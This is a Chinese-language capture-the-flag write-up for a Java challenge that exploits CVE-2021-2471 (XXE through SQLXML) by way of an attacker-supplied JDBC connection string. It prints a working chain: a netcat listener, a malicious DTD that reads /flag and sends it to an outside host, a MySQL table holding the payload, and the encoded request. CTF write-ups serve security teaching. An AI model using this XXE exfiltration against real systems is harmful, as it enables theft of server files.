# EzJava

主页提示路由 `/vuln` ，访问后有本题的提示：

```
为什么是Java?Jar包能干嘛?JDBC依赖是什么?CVE是什么?XXE是什么?怎么读取到Flag?SQL是什么?上哪去搭恶意服务?读了Flag却看不到?那咋办呢o.O?
```

下载的jar包可以用 [jadx-gui](https://github.com/skylot/jadx) 反编译，拿到源代码后关注 `org.example.ezjava` 这个包的内容，里面就是本体的源码，在"MainController"中能看到POST访问 `/vuln` 路由时，用户可以传入自定义的 jdbc 连接串，通过该连接串 jdbc 将会访问指定的远程数据库，从库中的 `exp` 表中访问记录的 `content` 内容，并将其作为XML解析。

```java
 @PostMapping({"/vuln"})
    public String vuln(@RequestParam(value = "jdbc_conn", defaultValue = "") String jdbc_conn) throws SQLException, ClassNotFoundException {
        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection connection = DriverManager.getConnection(jdbc_conn);
        if (connection != null) {
            Statement statement = connection.createStatement();
            statement.execute("select * from exp");
            ResultSet resultSet = statement.getResultSet();
            while (resultSet.next()) {
                SQLXML sqlxml = resultSet.getSQLXML("content");
                sqlxml.getSource(DOMSource.class);
            }
            return "O.o你拿到flag了吗?";
        }
        return "O.o你拿到flag了吗?";
    }
```

结合提示与搜索引擎能够找到这是个公开漏洞：CVE-2021-2471。漏洞细节大家自己搜索技术博客学习，简单来说就是 `SQLXML` 这个类的 `getSource` 方法允许XXE攻击。提示中给出flag的位置在根目录下，我们需要用XXE读取 `/flag` 文件并将其外带。我们需要在公网（服务器或者内网穿透）搭建一个Mysql服务，任意创建一个库，添加一张名为 `exp` 表格，保证其有 `content` 字段，并写入一条记录，其 `content` 字段的内容是 XXE 的攻击 payload 即可。关于 XXE 的攻击细节自行学习，下面提供参考的攻击流程与payload。

---

假设公网有一台用于攻击的服务器，其IP是 `233.233.233.233`：

1. 使用 `23333` 端口监听外带的flag：

   ```bash
   nc -lvnp 23333 
   ```

2. 搭建静态网页服务，服务起在 80 端口，放置一个恶意dtd文件，其路径为静态网站根目录下的：`XXE/evil.dtd` ，内容：

   ```dtd
   <!ENTITY % secret SYSTEM "file:///flag">
   <!ENTITY % evil_dtd "<!ENTITY &#37; exp SYSTEM 'http://233.233.233.233:23333/?res=%secret;'>">
   %evil_dtd;
   %exp;
   ```

3. Mysql服务搭建在 3306 端口，账户密码为 `root:root`，创建一个名为 `Test` 的数据库，创建一张 `exp` 表：

   ```mysql
   CREATE TABLE `exp` (
     `id` int NOT NULL AUTO_INCREMENT,
     `content` text,
     PRIMARY KEY (`id`)
   ) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
   ```

   插入一条记录：

   ```mysql
   insert into `exp`(content) values('<?xml version="1.0" encoding="utf-8"?><!DOCTYPE remote SYSTEM "http://233.233.233.233:80/XXE/evil.dtd">');
   ```

4. 确保上述服务都搭建完毕，且都可以被正确的访问（不行的话检查服务状态和防火墙），然后POST访问 `/vuln` 路由，需要传入的jdbc连接串如下：

   ```mysql
   jdbc:mysql://233.233.233.233:3306/Test?user=root&password=root
   ```

   传参时需要URL编码，最后传入的参数长这样：

   ```php
   jdbc_conn=jdbc%3Amysql%3A%2F%2F233%2E233%2E233%2E233%3A3306%2FTest%3Fuser%3Droot%26password%3Droot
   ```

   如果你的操作正确，你能在监听外带信息的端口看到类似如下的请求包：

   ```bash
   Listening on 0.0.0.0 23333
   Connection received on 124.222.157.100 52522
   GET /?res=r00t2024{5a124970-b219-4818-8460-76a5ce491df7} HTTP/1.1
   User-Agent: Java/17-ea
   Host: 233.233.233.233:23333
   Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
   Connection: keep-alive
   ```

   

